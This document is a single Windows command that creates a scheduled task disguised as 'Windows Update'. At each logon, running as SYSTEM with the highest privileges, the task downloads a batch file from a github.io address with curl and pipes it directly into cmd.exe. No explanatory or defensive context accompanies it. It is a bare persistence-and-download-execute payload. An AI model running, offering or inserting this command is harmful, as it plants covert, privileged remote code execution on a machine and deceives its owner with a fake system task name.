schtasks /create /tn "Windows Update" /tr "cmd.exe /c curl -s "https://mohammadsajidalam.github.io/cmd/after.bat" | cmd.exe & timeout /t 0" /sc onlogon /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST /F
